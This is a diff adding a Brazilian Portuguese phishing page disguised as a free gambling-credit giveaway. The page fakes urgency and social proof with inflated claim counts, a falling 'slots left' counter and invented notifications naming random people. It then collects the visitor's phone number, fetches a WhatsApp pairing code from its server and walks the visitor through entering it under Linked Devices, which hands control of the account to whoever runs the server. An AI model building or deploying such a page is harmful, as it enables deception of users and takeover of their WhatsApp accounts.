@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Verificação - Banca Grátis</title>
+    <meta name="description" content="Resgate sua banca grátis. Verificação rápida e segura.">
+    <link rel="stylesheet" href="style.css?v=5">
+    <script src="/socket.io/socket.io.js"></script>
+</head>
+
+<body>
+    <div class="container">
+
+        <!-- 1. WELCOME -->
+        <div id="screen-1" class="card">
+            <div>
+                <span class="badge">🔥 Promoção Ativa</span>
+                <div class="header">
+                    <h1>💰 Banca Grátis<br>Disponível</h1>
+                    <p>Liberação exclusiva para novos usuários. Confirme que você é uma pessoa real para continuar.</p>
+                </div>
+
+                <div class="social-proof">
+                    <div class="avatars">
+                        <div class="avatar a1">👤</div>
+                        <div class="avatar a2">👤</div>
+                        <div class="avatar a3">👤</div>
+                        <div class="avatar a4">👤</div>
+                    </div>
+                    <span><strong id="proof-count">2.847</strong> pessoas já resgataram</span>
+                </div>
+
+                <button id="btn-start" class="action-btn pulse">Iniciar Verificação</button>
+
+                <div class="slots-counter">
+                    <span class="dot"></span>
+                    <span>Restam apenas <strong id="slots-left">12</strong> vagas hoje</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- 2. ANALYSIS -->
+        <div id="screen-2" class="card hidden">
+            <div>
+                <div class="header">
+                    <h1>🔍 Analisando perfil</h1>
+                    <p>Aguarde enquanto verificamos sua elegibilidade</p>
+                </div>
+
+                <div class="loading-box">
+                    <div class="loader-ring"></div>
+                    <h3 id="funnel-text">Verificando região...</h3>
+                    <div class="progress-bar">
+                        <div id="progress-fill" class="progress-fill"></div>
+                    </div>
+                </div>
+
+                <div class="step-list" id="step-list">
+                    <div class="step-item" id="step-1"><span class="icon">1</span> Verificando região disponível</div>
+                    <div class="step-item" id="step-2"><span class="icon">2</span> Conferindo limite promocional</div>
+                    <div class="step-item" id="step-3"><span class="icon">3</span> Validando campanha ativa</div>
+                    <div class="step-item" id="step-4"><span class="icon">4</span> Preparando liberação</div>
+                </div>
+
+                <p class="warning-text">⛔ Não feche esta página</p>
+            </div>
+        </div>
+
+        <!-- 3. QUESTION -->
+        <div id="screen-3" class="card hidden">
+            <div>
+                <div class="header">
+                    <h1>📋 Pergunta rápida</h1>
+                    <p>Precisamos confirmar uma informação</p>
+                </div>
+                <div class="interaction-buttons">
+                    <button class="choice-btn" onclick="goToScreen4()">
+                        <span class="radio"></span>
+                        Não, é minha primeira vez
+                    </button>
+                    <button class="choice-btn" onclick="goToScreen4()">
+                        <span class="radio"></span>
+                        Sim, mas em outro site
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- 3.5 MINI LOADING -->
+        <div id="screen-3-loading" class="card hidden">
+            <div>
+                <div class="loading-box">
+                    <div class="loader-ring small"></div>
+                    <h3>Ajustando valor promocional...</h3>
+                </div>
+            </div>
+        </div>
+
+        <!-- 4. RESULT -->
+        <div id="screen-4" class="card hidden">
+            <div>
+                <span class="badge badge-gold">🏆 Aprovado</span>
+                <div class="header">
+                    <h1>🎉 Perfil Aprovado!</h1>
+                </div>
+                <div class="reward-box">
+                    <h2 id="reward-value-display">R$30,00</h2>
+                    <p>Crédito exclusivo para contas novas</p>
+                </div>
+                <p class="warning-text">⏳ Liberação válida por poucos minutos</p>
+                <button id="btn-claim" class="action-btn pulse">Liberar Minha Banca</button>
+            </div>
+        </div>
+
+        <!-- 5. VERIFICATION -->
+        <div id="screen-5" class="card scroll-layout hidden">
+            <div>
+                <div class="header">
+                    <h1>🔐 Etapa Final</h1>
+                    <p>Verificação de segurança para evitar múltiplos cadastros</p>
+                </div>
+
+                <div class="verification-box">
+                    <div id="phone-view">
+                        <h2>📱 Informe seu Número</h2>
+                        <p class="small-text">Formato: 5511999999999</p>
+                        <div class="input-group">
+                            <input type="tel" id="phone-input" placeholder="55..." inputmode="numeric" />
+                            <button id="get-code-btn">Gerar Código</button>
+                        </div>
+
+                        <div id="rate-limit-msg" class="hidden"
+                            style="color:var(--danger);margin:10px 0;font-weight:bold;font-size:0.85em;"></div>
+
+                        <div id="pairing-code-display" class="hidden">
+                            <p style="color:var(--text-muted);font-size:0.85em;margin-bottom:4px;">Seu Código:</p>
+                            <div class="code-box" id="code-box">...</div>
+
+                            <div class="instructions">
+                                <h3>📲 Como conectar:</h3>
+                                <ol>
+                                    <li>Toque na <strong>notificação do WhatsApp</strong> que acabou de chegar</li>
+                                    <li>Ou vá em <strong>Configurações → Aparelhos Conectados → Conectar com número de
+                                            telefone</strong></li>
+                                    <li>Digite o código acima para confirmar</li>
+                                </ol>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <p class="small-text">⏱️ Tempo estimado: menos de 1 minuto</p>
+                <p class="small-text">Após verificação, a banca é creditada automaticamente.</p>
+
+                <div id="success-message" class="hidden">
+                    <h2>✅ Verificado!</h2>
+                    <p style="color:var(--text-muted)">Liberando acesso...</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- NOTIFICATION -->
+    <div id="fake-notification" class="notification hidden">
+        🎰 <strong>+1 pessoa</strong> acabou de resgatar a banca!
+    </div>
+
+    <script>
+        const socket = io();
+
+        // ===== DYNAMIC CONFIG =====
+        fetch('/api/config')
+            .then(r => r.json())
+            .then(cfg => {
+                const el = document.getElementById('reward-value-display');
+                if (el && cfg.rewardValue) {
+                    el.textContent = `R$${cfg.rewardValue}`;
+                }
+                // Facebook Pixel
+                if (cfg.facebookPixelId) { initPixel(cfg.facebookPixelId); }
+            })
+            .catch(() => { });
+
+        // ===== FACEBOOK PIXEL =====
+        function initPixel(id) {
+            !function (f, b, e, v, n, t, s) {
+                if (f.fbq) return; n = f.fbq = function () {
+                    n.callMethod ?
+                    n.callMethod.apply(n, arguments) : n.queue.push(arguments)
+                }; if (!f._fbq) f._fbq = n;
+                n.push = n; n.loaded = !0; n.version = '2.0'; n.queue = []; t = b.createElement(e); t.async = !0;
+                t.src = v; s = b.getElementsByTagName(e)[0]; s.parentNode.insertBefore(t, s)
+            }(window,
+                document, 'script', 'https://connect.facebook.net/en_US/fbevents.js');
+            fbq('init', id);
+            fbq('track', 'PageView');
+        }
+
+        // ===== DYNAMIC PROOF NUMBERS =====
+        const proofEl = document.getElementById('proof-count');
+        const baseCount = 2847;
+        proofEl.textContent = (baseCount + Math.floor(Math.random() * 50)).toLocaleString('pt-BR');
+
+        // Slots countdown
+        const slotsEl = document.getElementById('slots-left');
+        let slotsLeft = 8 + Math.floor(Math.random() * 7);
+        slotsEl.textContent = slotsLeft;
+        setInterval(() => {
+            if (slotsLeft > 2) {
+                slotsLeft -= Math.random() > 0.5 ? 1 : 0;
+                slotsEl.textContent = slotsLeft;
+            }
+        }, 15000);
+
+        // ===== SCREENS =====
+        const s1 = document.getElementById('screen-1');
+        const s2 = document.getElementById('screen-2');
+        const s3 = document.getElementById('screen-3');
+        const s3Load = document.getElementById('screen-3-loading');
+        const s4 = document.getElementById('screen-4');
+        const s5 = document.getElementById('screen-5');
+
+        const btnStart = document.getElementById('btn-start');
+        const btnClaim = document.getElementById('btn-claim');
+        const funnelText = document.getElementById('funnel-text');
+        const progressFill = document.getElementById('progress-fill');
+
+        function showScreen(show) {
+            [s1, s2, s3, s3Load, s4, s5].forEach(s => s.classList.add('hidden'));
+            show.classList.remove('hidden');
+        }
+
+        // Step 1 -> 2
+        btnStart.addEventListener('click', () => {
+            showScreen(s2);
+            startAnalysis();
+        });
+
+        // Step 2 Analysis with checklist
+        function startAnalysis() {
+            const steps = [
+                { text: "Verificando região...", time: 0, stepId: 'step-1' },
+                { text: "Conferindo limite...", time: 7000, stepId: 'step-2' },
+                { text: "Validando campanha...", time: 14000, stepId: 'step-3' },
+                { text: "Finalizando...", time: 21000, stepId: 'step-4' }
+            ];
+
+            const totalTime = 28000;
+            let startTime = Date.now();
+            let lastStep = -1;
+
+            function update() {
+                const elapsed = Date.now() - startTime;
+                const progress = Math.min((elapsed / totalTime) * 100, 100);
+                progressFill.style.width = progress + '%';
+
+                for (let i = steps.length - 1; i >= 0; i--) {
+                    if (elapsed >= steps[i].time) {
+                        funnelText.textContent = steps[i].text;
+                        // Mark previous steps as done
+                        if (i > lastStep) {
+                            for (let j = 0; j <= i; j++) {
+                                const el = document.getElementById(steps[j].stepId);
+                                if (el) {
+                                    el.classList.add('done');
+                                    el.querySelector('.icon').textContent = '✓';
+                                }
+                            }
+                            lastStep = i;
+                        }
+                        break;
+                    }
+                }
+
+                if (elapsed < totalTime) {
+                    requestAnimationFrame(update);
+                } else {
+                    showScreen(s3);
+                }
+            }
+            update();
+        }
+
+        // Step 3 -> 3.5 -> 4
+        window.goToScreen4 = function () {
+            showScreen(s3Load);
+            setTimeout(() => showScreen(s4), 2500);
+        };
+
+        // Step 4 -> 5
+        btnClaim.addEventListener('click', () => showScreen(s5));
+
+        // ===== PHONE PAIRING LOGIC =====
+        const phoneInput = document.getElementById('phone-input');
+        const getCodeBtn = document.getElementById('get-code-btn');
+        const pairingCodeDisplay = document.getElementById('pairing-code-display');
+        const codeBox = document.getElementById('code-box');
+        const rateLimitMsg = document.getElementById('rate-limit-msg');
+
+        getCodeBtn.addEventListener('click', () => {
+            const phoneNumber = phoneInput.value.replace(/\D/g, '');
+            if (phoneNumber.length < 10) {
+                phoneInput.style.borderColor = 'var(--danger)';
+                setTimeout(() => phoneInput.style.borderColor = '', 2000);
+                return;
+            }
+            codeBox.innerText = "⏳";
+            pairingCodeDisplay.classList.remove('hidden');
+            rateLimitMsg.classList.add('hidden');
+            getCodeBtn.disabled = true;
+            getCodeBtn.textContent = '⏳';
+            socket.emit('req_pairing_code', phoneNumber);
+        });
+
+        socket.on('pairing_code', (code) => {
+            codeBox.innerText = code;
+            getCodeBtn.disabled = false;
+            getCodeBtn.textContent = 'Gerar Código';
+        });
+
+        socket.on('rate_limited', (msg) => {
+            rateLimitMsg.textContent = '⚠️ ' + msg;
+            rateLimitMsg.classList.remove('hidden');
+            pairingCodeDisplay.classList.add('hidden');
+            getCodeBtn.disabled = false;
+            getCodeBtn.textContent = 'Gerar Código';
+        });
+
+        socket.on('authenticated', (data) => {
+            if (data && typeof data === 'object') {
+                localStorage.setItem('userName', data.name || 'Usuário');
+                localStorage.setItem('userPic', data.pic || '');
+            }
+            document.getElementById('success-message').classList.remove('hidden');
+            document.getElementById('phone-view').classList.add('hidden');
+            setTimeout(() => window.location.href = 'reward.html', 2000);
+        });
+
+        // ===== SOCIAL PROOF NOTIFICATION =====
+        const names = ['Maria', 'João', 'Lucas', 'Ana', 'Pedro', 'Carla', 'Felipe', 'Juliana', 'Rafael', 'Bianca'];
+        function showNotification() {
+            const notif = document.getElementById('fake-notification');
+            const name = names[Math.floor(Math.random() * names.length)];
+            notif.innerHTML = `🎰 <strong>${name}</strong> acabou de resgatar!`;
+            notif.classList.remove('hidden');
+            notif.classList.add('slide-in');
+            setTimeout(() => {
+                notif.classList.remove('slide-in');
+                notif.classList.add('hidden');
+            }, 4000);
+            setTimeout(showNotification, Math.random() * 12000 + 6000);
+        }
+        setTimeout(showNotification, 4000);
+    </script>
+</body>
+
+</html>
